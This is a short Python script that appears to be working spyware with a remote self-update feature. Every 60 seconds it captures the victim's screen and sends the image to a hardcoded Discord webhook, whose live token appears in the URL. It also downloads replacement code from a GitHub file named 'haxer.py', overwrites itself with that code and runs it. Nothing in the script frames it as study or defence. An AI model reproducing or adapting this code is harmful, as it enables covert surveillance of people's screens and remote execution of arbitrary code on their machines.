V=0.1
import requests, time, pyautogui, datetime, io, inspect, os

def sendMsg(content, image=""):
  files = {}
  if image:
    # Convert image to appropriate format
    img_byte_arr = io.BytesIO()
    image.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    files = {'file': ('image.png', img_byte_arr, 'image/png')}
  # Send Request
  requests.post("https://discord.com/api/webhooks/1183724561871667210/rumYPqCJ64VTHyJ0PesbYKA-duW2oqeL30SFIwAhXFalK80HNeaScF7gq7PhnK6Jhh7P", data={"content":content}, files=files)

sendMsg("Successfully connected!")

# Main Loop
while True:
  # Send Data
  screenshot = pyautogui.screenshot()
  sendMsg(f"# Update at {str(datetime.datetime.now())}\nHallo\nScreenshot:", screenshot)

  # Self-Updater
  r = requests.get("https://raw.githubusercontent.com/kiwuthegamer/Metamorphic/main/haxer.py")
  script = inspect.getsource(inspect.getmodule(inspect.currentframe()))
  scriptVersion = script.splitlines()[0].split("=")[1]
  rScript = r.text
  rScriptVersion = r.text.splitlines()[0].split("=")[1]
  if rScriptVersion != scriptVersion: # Check if an update is needed
    sendMsg("Found Script Update!")
    sendMsg("Updating Script")
    
    # Edit the python file
    with open(__file__, "w") as f:
      f.write(r.text)
    
    sendMsg("Update Complete!")
    sendMsg("Refreshing Script")

    os.system(__file__)
    exit()

  # Sleep
  time.sleep(60)